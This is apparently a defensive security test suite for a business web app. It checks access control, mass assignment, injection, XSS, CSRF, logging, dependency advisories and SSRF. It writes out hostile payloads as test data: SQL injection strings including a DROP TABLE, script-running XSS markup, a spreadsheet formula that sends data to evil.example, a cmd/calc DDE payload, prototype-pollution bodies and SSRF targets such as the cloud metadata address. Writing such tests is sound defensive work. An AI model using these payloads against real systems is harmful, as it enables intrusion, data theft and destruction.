  test("SEC-24b [A01] a user manager cannot reset, disable or edit an account that holds permissions they lack (account takeover)", async () => {
    const um = await owner.post("/api/roles", { name: "Users only 2", description: "", permissions: ["users.manage"] });
    const userMgr = await staffWithRoleId(owner, "sec-um2", um.body.id);
    // (own usernames: "sec-victim" is taken by an earlier test, and a refused create would leave the ids undefined)
    const victim = await owner.post("/api/user", { username: "sec-victim-admin", name: "Victim", roleIds: [ids.administrator] });
    const peer = await owner.post("/api/user", { username: "sec-peer-um", name: "Peer", roleIds: [um.body.id] });
    assert.equal(victim.status, 200, JSON.stringify(victim.body));
    assert.equal(peer.status, 200, JSON.stringify(peer.body));
    const attempts = [
      ["reset Administrator's password", await userMgr.post(`/api/user/${victim.body.id}/password`, {})],
      ["disable Administrator", await userMgr.patch(`/api/user/${victim.body.id}`, { status: "disabled" })],
      ["rename Administrator", await userMgr.patch(`/api/user/${victim.body.id}`, { name: "Hacked" })],
      ["sign Administrator out", await userMgr.delete(`/api/user/${victim.body.id}/sessions`)],
    ];
    const allowed = attempts.filter(([, r]) => r.status !== 403).map(([what, r]) => `${what}: ${r.status}`);
    const same = await userMgr.post(`/api/user/${peer.body.id}/password`, {});
    log(`${attempts.length} takeover attempts, ${allowed.length} not refused; same-level reset -> ${same.status}`);
    assert.deepEqual(allowed, []);
    assert.equal(same.status, 200, "managing an account with permissions you hold must still work");
  });

  test("SEC-25 [A01] extra fields in requests cannot set passwords, owner status or counters (mass assignment)", async () => {
    const made = await owner.post("/api/user", {
      username: "sec-mass", name: "Mass", roleIds: [ids.sales],
      password: "Chosen-pass-1", status: "disabled", mustChangePassword: false, isOwner: true,
      password_hash: "scrypt$1$1$1$AA$AA", failed_login_count: 0, created_by: 1, id: 1,
    });
    const chosen = await new Client().post("/api/auth/login", { username: "sec-mass", password: "Chosen-pass-1" });
    const temp = await new Client().login("sec-mass", made.body.temporaryPassword);
    const me = (await temp.get("/api/auth/me")).body.user;
    const patch = await owner.patch(`/api/user/${made.body.id}`, {
      password_hash: "scrypt$1$1$1$AA$AA", failed_login_count: 99, locked_until: "2099-01-01", must_change_password: false, isOwner: true, id: 1,
    });
    const row1 = await one("SELECT status, must_change_password AS mcp, failed_login_count AS f, locked_until FROM auth_users WHERE username = 'sec-mass'");
    const again = await new Client().post("/api/auth/login", { username: "sec-mass", password: made.body.temporaryPassword });
    log(`chosen password works: ${chosen.status === 200}; account owner: ${me.isOwner}; forced change: ${me.mustChangePassword}; PATCH ${patch.status}; row ${JSON.stringify(row1)}`);
    assert.notEqual(chosen.status, 200, "a password supplied by the caller was used");
    assert.equal(me.isOwner, false);
    assert.equal(me.mustChangePassword, true);
    assert.equal(row1.status, "active");
    assert.equal(row1.f, 0);
    assert.equal(row1.locked_until, null);
    assert.equal(again.status, 200, "the account was damaged by extra fields");
  });

  test("SEC-26 [A01/A04] the server rejects impossible business data (negative sales, absurd amounts) from a low-privilege role", async () => {
    await loadStores(shopFixture());
    const r = await cashier.post("/api/learnex/sync", {
      changes: [
        { store: "salesOrders", upserts: [{ id: "SO-SEC-NEG", invoice: "INV-SEC", customer: "x", items: 1, lineItems: [], amount: -500000, tax: 0, status: "Delivered", payment: "Paid", date: "2026-02-01", amountPaid: 999999999 }], order: ["SO-SEC-NEG"] },
        { store: "ledger", upserts: [{ id: "TXN-SEC-NEG", date: "2099-01-01", desc: "x", type: "Expense", category: "Rent", amount: -1e12 }], order: ["TXN-SEC-NEG"] },
        { store: "products", upserts: [{ id: 101, name: "Alpha Printer", sku: "ALP-1", category: "Printers", price: -1, cost: 600, stock: -999, min: 2, unit: "pc" }], order: [101] },
      ],
    });
    const saved = (await stores()).products.find((p) => p.id === 101);
    log(`sync of a -500,000 sale, a -1e12 expense dated 2099 and a product with price -1 / stock -999 -> ${r.status}; product now price=${saved?.price} stock=${saved?.stock}`);
    await loadStores(shopFixture());
    assert.ok(r.status >= 400 && r.status < 500, `the server stored them (HTTP ${r.status}): all business rules live only in the browser`);
  });
});

/* ================================================================== */
/* D. Injection and cross-site scripting (A03)                         */
/* ================================================================== */

describe("D. Injection and XSS", () => {
  const SQLI = [
    "'", '"', "\\", "' OR '1'='1", "' OR 1=1-- ", "admin'-- ", "'; DROP TABLE auth_users; -- ",
    "' UNION SELECT 1,2,3,4,5,6,7,8,9,10 -- ", "1; SELECT SLEEP(4); -- ", "' AND SLEEP(4) -- ",
    "') OR SLEEP(4) -- ", "\u0000", "%", "_", "`", "' || '", "1' ORDER BY 99-- ", "𝒳😀 emoji",
  ];

  test("SEC-27 [A03] SQL injection: hostile text in every input is stored as plain data and never runs as SQL", async () => {
    await loadStores(shopFixture());
    const tables = async () => (await one("SELECT count(*) AS n FROM information_schema.tables WHERE table_schema = DATABASE()")).n;
    const usersBefore = (await one("SELECT count(*) AS n FROM auth_users")).n;
    const tablesBefore = await tables();
    const problems = [];
    let requests = 0;
    let slowest = 0;
    const note = (label, r, ms, extra) => {
      requests++;
      slowest = Math.max(slowest, ms);
      if (r.status >= 500 || ms > 3500 || extra) problems.push(`${label} -> ${r.status} ${ms} ms ${extra ?? JSON.stringify(r.body)?.slice(0, 100)}`);
    };
    let created = 0;
    for (const [i, p] of SQLI.entries()) {
      const enc = encodeURIComponent(p);
      let t = await timed(() => new Client().post("/api/auth/login", { username: p, password: "x" }));
      note(`login username #${i}`, t.value, t.ms, t.value.status === 200 ? "SIGNED IN" : undefined);
      t = await timed(() => owner.get("/api/audit?" + new URLSearchParams({ action: p, user: p, before: p, limit: p })));
      note(`audit filters #${i}`, t.value, t.ms, t.value.status === 200 ? undefined : `status ${t.value.status}`);
      for (const [m, url, body] of [["patch", `/api/user/${enc}`, {}], ["put", `/api/user/${enc}/role`, {}], ["patch", `/api/roles/${enc}`, {}]]) {
        t = await timed(() => owner[m](url, body));
        note(`${m} ${url.split("/").slice(0, 4).join("/")}/<payload> #${i}`, t.value, t.ms, t.value.status === 404 ? undefined : `status ${t.value.status}`);
      }
      t = await timed(() => owner.post("/api/user", { username: `sec-sqli-${i}`, name: p.slice(0, 100) || "x", roleIds: [ids.sales] }));
      if (t.value.status === 200) created++;
      note(`create user name #${i}`, t.value, t.ms, t.value.status === 200 || t.value.status === 400 ? undefined : `status ${t.value.status}`);
      t = await timed(() => owner.post("/api/roles", { name: `${i}:${p}`.slice(0, 60), description: p, permissions: [] }));
      note(`create role #${i}`, t.value, t.ms, t.value.status === 200 || t.value.status === 400 ? undefined : `status ${t.value.status}`);
      const id = `T${i}-${p}`.slice(0, 150).replace(/ +$/, "");
      t = await timed(() => owner.post("/api/learnex/sync", { changes: [{ store: "ledger", upserts: [{ id, date: "2026-02-01", desc: p, type: "Expense", category: p, amount: 1 }], order: [id] }] }));
      note(`sync ledger id/desc #${i}`, t.value, t.ms, t.value.status === 200 ? undefined : `status ${t.value.status}`);
      const back = (await stores()).ledger.find((e) => e.id === id);
      if (!back || back.desc !== p) problems.push(`second-order #${i}: stored value changed: ${JSON.stringify(back?.desc)} vs ${JSON.stringify(p)}`);
      t = await timed(() => owner.post("/api/learnex/sync", { changes: [{ store: "ledger", deletes: [id] }] }));
      note(`sync ledger delete #${i}`, t.value, t.ms, t.value.status === 200 ? undefined : `status ${t.value.status}`);
    }
    const usersAfter = (await one("SELECT count(*) AS n FROM auth_users")).n;
    log(`${requests} hostile requests across ${SQLI.length} payloads; slowest ${slowest} ms; users ${usersBefore} -> ${usersAfter} (+${created} created); tables ${tablesBefore} -> ${await tables()}`);
    assert.equal(await tables(), tablesBefore, "a table disappeared or appeared");
    assert.equal(usersAfter, usersBefore + created, "account table changed unexpectedly");
    assert.deepEqual(problems, []);
  });

  // ------------------------------------------------------------- XSS
  const X = "window.__xss=(window.__xss||0)+1";
  const evil = (tag) => `<img src=x onerror="${X}"><svg/onload="${X}"><script>${X}</script>"'><b id="xss-${tag}">${tag}`;
  const evilShort = `<img src=x onerror=${X}>`; // ≤ 60 characters, fits a role name
  function xssFixture() {
    const d = shopFixture();
    d.products[0] = { ...d.products[0], name: evil("p-name"), sku: evil("p-sku"), category: evil("p-cat") };
    d.customers[0] = { ...d.customers[0], name: evil("c-name"), contact: evil("c-contact"), phone: evil("c-phone"), email: evil("c-email") };
    d.suppliers[0] = { ...d.suppliers[0], name: evil("s-name"), contact: evil("s-contact") };
    d.rawMaterials[0] = { ...d.rawMaterials[0], name: evil("rm-name"), supplier: evil("rm-sup"), notes: evil("rm-notes") };
    d.cashAccounts[1] = { ...d.cashAccounts[1], name: evil("ca-name"), notes: evil("ca-notes") };
    d.settings = { ...d.settings, businessName: evil("biz"), businessAddress: evil("addr"), businessPhone: evil("tel"), businessEmail: evil("mail"), invoiceNote: evil("inote") };
    d.salesOrders = [
      { id: "SO-1001", invoice: "INV-1001", customer: evil("so-cust"), customerId: 201, items: 1, lineItems: [{ productId: 101, name: evil("so-line"), qty: 1, price: 1000, unit: evil("so-unit") }], amount: 1100, tax: 100, status: "Delivered", payment: "Pending", date: "2026-02-07", channel: "Manual", amountPaid: 0, accrued: true, note: evil("so-note"), attachment: { name: evil("att"), type: "image/png", dataUrl: `javascript:${X}` } },
      { id: "SO-1002", invoice: "INV-1002", customer: "Bob Retail", customerId: 202, items: 1, lineItems: [{ productId: 102, name: "Beta Toner", qty: 1, price: 250 }], amount: 275, tax: 25, status: "Delivered", payment: "Pending", date: "2026-02-08", channel: "Manual", amountPaid: 0, accrued: true, attachment: { name: "page.html", type: "text/html", dataUrl: `data:text/html,<script>${X}</script>` } },
    ];
    d.purchaseOrders = [{ id: "PO-4001", supplier: evil("po-sup"), supplierId: 301, items: 1, lineItems: [{ materialId: 401, name: evil("po-line"), qty: 1, cost: 100 }], total: 100, date: "2026-02-08", paymentStatus: "Unpaid", amountPaid: 0 }];
    d.rawMaterialUsage = [{ id: "USE-1001", date: "2026-02-09", materialId: 401, materialName: evil("use-name"), qtyUsed: 1, remainingQty: 9, user: evil("use-user"), notes: evil("use-notes"), consumedValue: 100 }];
    d.ledger = [{ id: "TXN-1001", date: "2026-02-01", desc: evil("ledger-desc"), type: "Expense", category: evil("ledger-cat"), amount: 50, account: "CASH-MAIN", kind: "opex", cash: true }];
    d.users = [{ name: evil("legacy-user"), email: evil("legacy-mail"), role: evil("legacy-role"), status: "Active" }];
    return d;
  }

  test("SEC-28 [A03] stored XSS: hostile text in every module, account name, role name and log entry never becomes script or markup", async () => {
    await loadStores(xssFixture());
    await owner.post("/api/user", { username: "sec-xss-user", name: evilShort, roleIds: [ids.sales] });
    await owner.post("/api/roles", { name: evilShort, description: evil("role-desc"), permissions: ["pos.use"] });
    await new Client().post("/api/auth/login", { username: evilShort, password: "x" }); // lands in the Activity Log
    const ctx = await browser.newContext({ viewport: { width: 1440, height: 900 }, acceptDownloads: true, baseURL: BASE });
    await ctx.request.post(`${BASE}/api/auth/login`, { data: { username: OWNER.username, password: OWNER.password } });
    // remember every Content-Security-Policy violation the browser reports, in every page of this context
    await ctx.addInitScript(() => {
      document.addEventListener("securitypolicyviolation", (e) => (window.__csp ||= []).push(e.violatedDirective));
    });
    const dialogs = [];
    const watch = (pg) => pg.on("dialog", (d) => (dialogs.push(d.message()), d.dismiss().catch(() => {})));
    ctx.on("page", watch);
    const page = await ctx.newPage();
    watch(page);
    const problems = [];
    let inspected = 0;
    let shownAsText = 0;
    const inspect = async (pg, where) => {
      const r = await pg.evaluate(() => ({
        fired: window.__xss || 0,
        injected: document.querySelectorAll('[onerror],[onload],[id^="xss-"]').length,
        scripts: [...document.scripts].filter((s) => s.textContent.includes("__xss")).length,
        shown: document.body.innerText.includes("onerror="),
      }));
      inspected++;
      if (r.shown) shownAsText++;
      if (r.fired || r.injected || r.scripts) problems.push(`${where}: ${JSON.stringify(r)}`);
    };
    await page.goto("/");
    await page.locator("aside nav").waitFor();
    for (const screen of ["Dashboard", "Point of Sale", "Products & Inventory", "Sales Orders", "Purchases", "Raw Materials", "Delivery Stock", "Customers", "Suppliers", "Cash & Bank", "Accounting", "Reports", "Settings"]) {
      await nav(page, screen);
      await page.waitForTimeout(450);
      await inspect(page, screen);
    }
    for (const tab of ["Ledger & Overview", "Profit or Loss", "Statement of Financial Position", "Statement of Cash Flows", "Statement of Changes in Equity"]) {
      await nav(page, "Accounting");
      await page.locator("main button", { hasText: tab }).first().click();
      await page.waitForTimeout(350);
      await inspect(page, `Accounting › ${tab}`);
    }
    for (const tab of ["Business Profile", "Users & Roles", "Notifications", "Data & Backup", "Activity Log"]) {
      await nav(page, "Settings");
      await page.locator("main button", { hasText: tab }).first().click();
      await page.waitForTimeout(500);
      await inspect(page, `Settings › ${tab}`);
    }
    // printed invoice (from the list and from the order dialog), then the report print views
    await nav(page, "Sales Orders");
    await page.waitForTimeout(300);
    const [invoice] = await Promise.all([page.waitForEvent("popup"), row(page, "SO-1001").getByRole("button", { name: "Invoice" }).click()]);
    await invoice.waitForLoadState();
    await invoice.waitForTimeout(400);
    await inspect(invoice, "Printed invoice window (from the list)");
    await invoice.close();
    await row(page, "SO-1001").click();
    await page.waitForTimeout(300);
    await inspect(page, "Sales order dialog");
    const [again] = await Promise.all([page.waitForEvent("popup"), modal(page).getByRole("button", { name: "Print Invoice" }).click()]);
    await again.waitForLoadState();
    await again.waitForTimeout(400);
    await inspect(again, "Printed invoice window (from the dialog)");
    await again.close();
    for (let i = 0; i < 4 && (await page.locator("div.fixed.inset-0").count()); i++) {
      await page.locator("div.fixed.inset-0").last().locator("h3 + button").click().catch(() => page.mouse.click(5, 5));
      await page.waitForTimeout(250);
    }
    await nav(page, "Reports");
    for (const report of ["Stock Valuation", "Supplier Purchases", "Cash Account Balances"]) {
      const card = page.locator("main div.rounded-2xl").filter({ has: page.locator("p", { hasText: new RegExp(`^${report}$`) }) });
      const [pdf] = await Promise.all([page.waitForEvent("popup"), card.getByRole("button", { name: "PDF" }).click()]);
      await pdf.waitForLoadState();
      await pdf.waitForTimeout(300);
      await inspect(pdf, `${report} print view`);
      await pdf.close();
    }
    await page.waitForTimeout(500);
    // Positive control: the very same payload inserted as raw HTML MUST be seen by the detector, otherwise
    // "nothing found" above would prove nothing. It is also the second line of defence at work: the page's
    // Content-Security-Policy refuses to run an inline handler, so the markup is there but does not fire.
    await page.evaluate((html) => document.body.insertAdjacentHTML("beforeend", html), evil("control"));
    await page.waitForTimeout(400);
    const control = await page.evaluate(() => ({
      fired: window.__xss || 0,
      injected: document.querySelectorAll('[onerror],[onload],[id^="xss-"]').length,
      blockedByCsp: (window.__csp || []).length,
    }));
    await ctx.close();
    log(`${inspected} views inspected (screens, tabs, dialog, invoice and report print windows); hostile text visible as plain text in ${shownAsText}; dialogs shown: ${dialogs.length}`);
    log(`detector self-check with raw HTML insertion: ${JSON.stringify(control)}`);
    await loadStores(shopFixture());
    assert.ok(control.injected > 0, "the XSS detector cannot see injected markup — this test proves nothing");
    assert.equal(control.fired, 0, "an injected inline handler RAN: the Content-Security-Policy did not stop it");
    assert.ok(control.blockedByCsp > 0, "the browser did not report blocking the injected inline handler");
    assert.deepEqual(problems, [], "hostile text executed or became markup");
    assert.deepEqual(dialogs, []);
    assert.ok(shownAsText >= 8, "the hostile text was not even displayed — the test did not exercise the screens");
  });

  test("SEC-29 [A03] attachment links (javascript: / data:text/html) never execute when 'View slip' is clicked", async () => {
    await loadStores(xssFixture());
    const ctx = await browser.newContext({ viewport: { width: 1440, height: 900 }, baseURL: BASE });
    await ctx.request.post(`${BASE}/api/auth/login`, { data: { username: OWNER.username, password: OWNER.password } });
    const page = await ctx.newPage();
    page.on("dialog", (d) => d.dismiss().catch(() => {}));
    await page.goto("/");
    await page.locator("aside nav").waitFor();
    await nav(page, "Sales Orders");
    await page.waitForTimeout(400);
    const hrefs = await page.locator('main a:has-text("View slip")').evaluateAll((as) => as.map((a) => a.getAttribute("href")));
    for (const sel of [row(page, "SO-1001"), row(page, "SO-1002")]) {
      await sel.locator('a:has-text("View slip")').click({ noWaitAfter: true }).catch(() => {});
      await page.waitForTimeout(700);
    }
    const fired = [];
    for (const pg of ctx.pages()) fired.push(await pg.evaluate(() => window.__xss || 0).catch(() => 0));
    await ctx.close();
    await loadStores(shopFixture());
    log(`links in the DOM: ${hrefs.map((h) => h?.slice(0, 40)).join(" | ")}; pages: ${fired.length}; script ran: ${fired.some(Boolean)}`);
    assert.ok(!fired.some(Boolean), "script from an attachment URL ran in the app's origin");
  });

  test("SEC-30 [A03] CSV exports neutralise spreadsheet formulas (=, +, -, @) typed into product names", async () => {
    const formulas = ['=HYPERLINK("http://evil.example/?"&A1,"click")', "+SUM(1+1)", "-2+3+cmd|' /C calc'!A0", "@SUM(1,1)", "\t=1+1"];
    const d = shopFixture();
    d.products = formulas.map((name, i) => ({ id: 500 + i, name, sku: `F-${i}`, category: "x", price: 10, cost: 5, stock: 1, min: 0, unit: "pc" }));
    await loadStores(d);
    const ctx = await browser.newContext({ viewport: { width: 1440, height: 900 }, acceptDownloads: true, baseURL: BASE });
    await ctx.request.post(`${BASE}/api/auth/login`, { data: { username: OWNER.username, password: OWNER.password } });
    const page = await ctx.newPage();
    await page.goto("/");
    await page.locator("aside nav").waitFor();
    await nav(page, "Reports");
    const card = page.locator("main div.rounded-2xl").filter({ has: page.locator("p", { hasText: /^Stock Valuation$/ }) });
    const { text } = await download(page, () => card.getByRole("button", { name: "CSV / Excel" }).click());
    await ctx.close();
    const cells = parseCsv(text).flat();
    const live = cells.filter((c) => /^[=+\-@\t\r]/.test(c) && formulas.some((f) => c.includes(f.trim().slice(1, 6))));
    log(`${formulas.length} formula payloads exported; cells that Excel would execute: ${live.length}`);
    await loadStores(shopFixture());
    assert.deepEqual(live, [], "cells starting with = + - @ are written as-is (CSV injection / formula injection)");
  });

  test("SEC-31 [A03] prototype-pollution style keys (__proto__, constructor) change no privileges and break nothing", async () => {
    const proto = (inner) =>
      `{${inner}${inner ? "," : ""}"__proto__":{"isOwner":true,"status":"disabled","roleIds":[1],"polluted":"yes"},"constructor":{"prototype":{"polluted2":"yes"}}}`;
    const statuses = [];
    statuses.push((await new Client().post("/api/auth/login", proto('"username":"nobody","password":"x"'))).status);
    statuses.push((await owner.post("/api/roles", proto('"name":"proto-role","description":"","permissions":[]'))).status);
    statuses.push((await owner.post("/api/user", proto(`"username":"sec-proto","name":"Proto","roleIds":[${ids.sales}]`))).status);
    statuses.push((await owner.post("/api/learnex/sync", `{"changes":[{"store":"customers","upserts":[{"id":9001,"name":"Proto","__proto__":{"polluted":"yes"}}],"order":[9001]}],"__proto__":{"polluted":"yes"}}`)).status);
    const patch = await owner.patch(`/api/user/${cashier.userId}`, {});
    const users = (await owner.get("/api/user")).body.users;
    const me = (await cashier.get("/api/auth/me")).body.user;
    const health = await new Client().get("/api/auth/me");
    log(`statuses ${statuses}; PATCH {} -> ${patch.status}; disabled accounts: ${users.filter((u) => u.status !== "active").length}; cashier isOwner=${me.isOwner}`);
    await loadStores(shopFixture());
    assert.ok(statuses.every((s) => s < 500), `server error for a polluted body: ${statuses}`);
    assert.equal(users.filter((u) => u.status !== "active").length, 0, "inherited 'status' disabled somebody");
    assert.equal(me.isOwner, false);
    assert.equal(health.status, 200);
  });

  test("SEC-32 [A03/A05] malformed and wrongly-typed bodies on every write endpoint never cause a server error", async () => {
    const bodies = [
      "null", "[]", '"x"', "123", "true", '{"a":1}', '{"__proto__":1}', "[".repeat(5000) + "]".repeat(5000),
      '{"username":["a"],"password":{"x":1}}', '{"changes":"x"}', '{"changes":[null]}', '{"changes":[[]]}',
      '{"changes":[{"store":["products"]}]}', '{"changes":[{"store":"products","upserts":"x"}]}',
      '{"changes":[{"store":"products","upserts":[{"id":1}],"order":"x"}]}', '{"changes":[{"store":"settings","value":[1]}]}',
      '{"stores":[]}', '{"roleIds":"x"}', '{"roleIds":[{}]}', '{"permissions":[null]}', '{"name":{},"description":[],"permissions":{}}',
      '{"currentPassword":[],"newPassword":{}}', '{"limit":"x"}',
    ];
    const custom = await owner.post("/api/roles", { name: "Fuzz target", description: "", permissions: [] });
    const endpoints = [
      ["POST", "/api/auth/login"], ["POST", "/api/auth/register"], ["POST", "/api/auth/password"],
      ["POST", "/api/learnex/sync"], ["POST", "/api/learnex/import"], ["POST", "/api/user"],
      ["PATCH", `/api/user/${cashier.userId}`], ["PUT", `/api/user/${cashier.userId}/role`],
      ["POST", "/api/roles"], ["PATCH", `/api/roles/${custom.body.id}`],
    ];
    const errors = [];
    let sent = 0;
    for (const [method, url] of endpoints) {
      for (const b of bodies) {
        const r = await owner.call(method, url, b);
        sent++;
        if (r.status >= 500) errors.push(`${method} ${url} ${b.slice(0, 40)} -> ${r.status} ${JSON.stringify(r.body)?.slice(0, 90)}`);
      }
    }
    const alive = await new Client().get("/api/auth/me");
    log(`${sent} malformed requests, ${errors.length} server error(s); server still answering: ${alive.status}`);
    await loadStores(shopFixture());
    assert.equal(alive.status, 200);
    assert.deepEqual(errors, []);
  });
});

/* ================================================================== */
/* E. Cross-site request forgery and cross-origin reads (A01/A08)      */
/* ================================================================== */

describe("E. Cross-site attacks", () => {
  test("SEC-33 [A01] API: every state-changing endpoint refuses a foreign Origin (and Origin: null)", async () => {
    const victimId = cashier.userId;
    const routes = [
      ["POST", "/api/auth/login", { username: "x", password: "y" }],
      ["POST", "/api/auth/logout", {}],
      ["POST", "/api/auth/password", { currentPassword: "a", newPassword: "bbbbbbbb" }],
      ["POST", "/api/learnex/sync", { changes: [{ store: "settings", value: {} }] }],
      ["POST", "/api/learnex/import", { stores: {} }],
      ["POST", "/api/learnex/reset", {}],
      ["POST", "/api/user", { username: "csrf-user", name: "x", roleIds: [ids.sales] }],
      ["PATCH", `/api/user/${victimId}`, { status: "disabled" }],
      ["PUT", `/api/user/${victimId}/role`, { roleIds: [ids.owner] }],
      ["POST", `/api/user/${victimId}/password`, {}],
      ["DELETE", `/api/user/${victimId}/sessions`, undefined],
      ["POST", "/api/roles", { name: "csrf", description: "", permissions: [] }],
      ["PATCH", "/api/roles/1", { name: "csrf", description: "", permissions: [] }],
      ["DELETE", "/api/roles/1", undefined],
    ];
    const accepted = [];
    for (const origin of ["https://evil.example", "null", `${BASE}.evil.example`, "http://localhost:3311.evil.example"]) {
      for (const [m, url, body] of routes) {
        const c = m === "POST" && url === "/api/auth/login" ? new Client() : owner;
        const r = await c.call(m, url, body, { origin });
        if (r.status !== 403 || r.body?.code !== "cross_site") accepted.push(`${m} ${url} [Origin ${origin}] -> ${r.status} ${r.body?.code ?? ""}`);
      }
    }
    log(`${routes.length * 4} forged requests, ${accepted.length} accepted`);
    const still = await owner.get("/api/auth/me");
    assert.equal(still.body.user?.username, "owner", "the owner's own session was damaged by the forged requests");
    assert.deepEqual(accepted, []);
  });

  test("SEC-34 [A01] real browser: another website cannot make the signed-in owner's browser reset data or read the API", async () => {
    await loadStores(shopFixture());
    const before = (await one("SELECT count(*) AS n FROM products")).n;
    // sign in through the browser's own cookie jar, so the cookie keeps its real SameSite attribute
    const ctx = await browser.newContext({ baseURL: BASE });
    await ctx.request.post(`${BASE}/api/auth/login`, { data: { username: OWNER.username, password: OWNER.password } });
    const page = await ctx.newPage();
    await page.goto("/");
    await page.locator("aside nav").waitFor();
    await page.goto(attacker.origin + "/xhr");
    await page.waitForFunction(() => window.__results, null, { timeout: 15000 });
    const results = await page.evaluate(() => window.__results);
    await page.goto(attacker.origin + "/csrf-form");
    await page.waitForURL(`${BASE}/**`, { timeout: 15000 }).catch(() => {});
    const formAnswer = ((await page.locator("body").innerText().catch(() => "")) || "").slice(0, 160);
    await ctx.close();
    const after = (await one("SELECT count(*) AS n FROM products")).n;
    log("cross-site fetch results:", JSON.stringify(results));
    log(`cross-site form POST answer: ${formAnswer}; products ${before} -> ${after}`);
    assert.equal(after, before, "data was changed by a request from another website");
    assert.ok(!results.readData.status || results.readData.status >= 400, "the attacker's page could read business data");
    assert.ok(!results.readMe.text?.includes('"owner"'), "the attacker's page could read the owner's identity");
    assert.ok(!/"ok":true/.test(formAnswer), "the forged form POST was accepted");
  });
});

/* ================================================================== */
/* F. Logging and monitoring (A09)                                     */
/* ================================================================== */

describe("F. Logging", () => {
  test("SEC-35 [A09] security-relevant events are logged with the real actor, and the log cannot be altered through the API", async () => {
    await staffWithRoleId(owner, "sec-log", ids.sales);
    await new Client().post("/api/auth/login", { username: "sec-log-ghost", password: "x" });
    for (let i = 0; i < 6; i++) await new Client().post("/api/auth/login", { username: "sec-log", password: `bad-${i}` });
    await unlock("sec-log");
    const role = await owner.post("/api/roles", { name: "Log role", description: "", permissions: ["pos.use"] });
    await owner.patch(`/api/roles/${role.body.id}`, { name: "Log role 2", description: "", permissions: ["pos.use", "sales.manage"] });
    await owner.delete(`/api/roles/${role.body.id}`);
    await owner.patch(`/api/user/${cashier.userId}`, { name: "Sec Cashier (renamed)" });
    await owner.post(`/api/user/${cashier.userId}/password`, {});
    await owner.delete(`/api/user/${cashier.userId}/sessions`);
    cashier = await createStaff(owner, { username: "sec-cashier2", name: "Cashier 2", roles: ["sales"] });
    await cashier.post("/api/learnex/sync", { changes: [{ store: "customers", upserts: [{ id: 9100, name: "Logged", actor: "owner", user: { username: "owner" } }], order: [9100] }], actor: "owner", username: "owner" });
    await api("/reset", {});
    await loadStores(shopFixture());
    const log1 = (await owner.get("/api/audit?limit=500")).body.entries;
    const actions = new Set(log1.map((e) => e.action));
    const need = ["auth.login_failed", "auth.login", "auth.password_change", "user.create", "user.update", "user.password_reset", "user.sign_out", "role.create", "role.update", "role.delete", "data.save", "data.reset", "data.import"];
    const missing = need.filter((a) => !actions.has(a));
    const lockedEntry = log1.some((e) => e.action === "auth.login_failed" && e.details?.reason === "locked");
    const save = log1.find((e) => e.action === "data.save" && /customers/.test(e.target ?? ""));
    const verbs = [];
    for (const m of ["POST", "PUT", "PATCH", "DELETE"]) verbs.push((await owner.call(m, "/api/audit", m === "DELETE" ? undefined : {})).status);
    log(`${log1.length} entries; missing actions: ${missing.join(", ") || "none"}; lock logged: ${lockedEntry}; data.save actor: ${save?.username}; write verbs on /api/audit -> ${verbs}`);
    assert.deepEqual(missing, []);
    assert.ok(lockedEntry, "lockouts are not logged");
    assert.equal(save?.username, "sec-cashier2", "the log took the actor from the request body instead of the session");
    assert.ok(verbs.every((s) => s === 405), `the log accepts write requests: ${verbs}`);
  });
});

/* ================================================================== */
/* G. Components and platform (A06 Vulnerable and outdated components) */
/* ================================================================== */

describe("G. Components and platform", () => {
  const semverLess = (a, b) => {
    const pa = a.split(".").map(Number);
    const pb = b.split(".").map(Number);
    for (let i = 0; i < 3; i++) if (pa[i] !== pb[i]) return pa[i] < pb[i];
    return false;
  };
  const nextVersion = JSON.parse(readFileSync(path.join(ROOT, "node_modules", "next", "package.json"), "utf8")).version;

  test("SEC-36 [A06] production dependencies have no known high or critical vulnerabilities (npm audit)", (t) => {
    const npmCli = path.join(path.dirname(process.execPath), "node_modules", "npm", "bin", "npm-cli.js");
    const r = spawnSync(process.execPath, [npmCli, "audit", "--omit=dev", "--json"], { encoding: "utf8", maxBuffer: 64 * 1024 * 1024 });
    let report;
    try {
      report = JSON.parse(r.stdout);
    } catch {
      t.skip("npm audit unavailable (offline?)");
      return;
    }
    if (!report.metadata?.vulnerabilities) {
      t.skip("npm audit gave no report (offline?)");
      return;
    }
    const v = report.metadata.vulnerabilities;
    const worst = Object.entries(report.vulnerabilities ?? {})
      .filter(([, x]) => x.severity === "critical" || x.severity === "high")
      .map(([name, x]) => `${name} (${x.severity})`);
    log(`production packages: ${JSON.stringify(v)}; high/critical: ${worst.join(", ")}`);
    assert.equal(v.critical + v.high, 0, `${v.critical} critical + ${v.high} high: ${worst.join(", ")}`);
  });

  test("SEC-37 [A06] Next.js is not in the range of CVE-2026-75604 (unauthenticated remote code execution on Windows-hosted servers)", () => {
    const config = readFileSync(path.join(ROOT, "next.config.ts"), "utf8");
    const usesCacheComponents = /cacheComponents|use cache/.test(config);
    const affectedPlatform = process.platform === "win32";
    const affected = affectedPlatform && !usesCacheComponents && semverLess(nextVersion, "16.3.3");
    log(`next ${nextVersion}; platform ${process.platform}; Cache Components enabled: ${usesCacheComponents}; patched in 16.3.3 (GHSA-p293-qw3h-jr36)`);
    assert.ok(!affected, `next ${nextVersion} on ${process.platform} matches the advisory (App Router without Cache Components, Windows host) — upgrade to ≥ 16.3.3`);
  });

  test("SEC-38 [A06] the package lockfile pins every dependency by integrity hash from the npm registry", () => {
    const lock = JSON.parse(readFileSync(path.join(ROOT, "package-lock.json"), "utf8"));
    const bad = [];
    for (const [name, p] of Object.entries(lock.packages)) {
      // (a package bundled inside another one's tarball is covered by that tarball's hash)
      if (!name || p.link || p.inBundle) continue;
      if (!p.integrity) bad.push(`${name}: no integrity hash`);
      if (p.resolved && !p.resolved.startsWith("https://registry.npmjs.org/")) bad.push(`${name}: ${p.resolved}`);
    }
    assert.deepEqual(bad, []);
  });

  test("SEC-39 [A10] the image optimiser endpoint cannot be used to fetch other servers (SSRF)", async () => {
    const targets = ["http://127.0.0.1:3306/", "http://169.254.169.254/latest/meta-data/", "http://localhost:3312/api/auth/me", "//evil.example/x.png", "file:///C:/Windows/win.ini"];
    const reached = [];
    for (const u of targets) {
      const r = await raw("GET", `/_next/image?url=${encodeURIComponent(u)}&w=64&q=75`);
      if (r.status === 200) reached.push(`${u} -> 200`);
    }
    const local = await raw("GET", "/_next/image?url=%2Ffile.svg&w=64&q=75");
    log(`remote targets reached: ${reached.length}; endpoint answers a local image with ${local.status} (so it is reachable)`);
    assert.deepEqual(reached, []);
  });
});
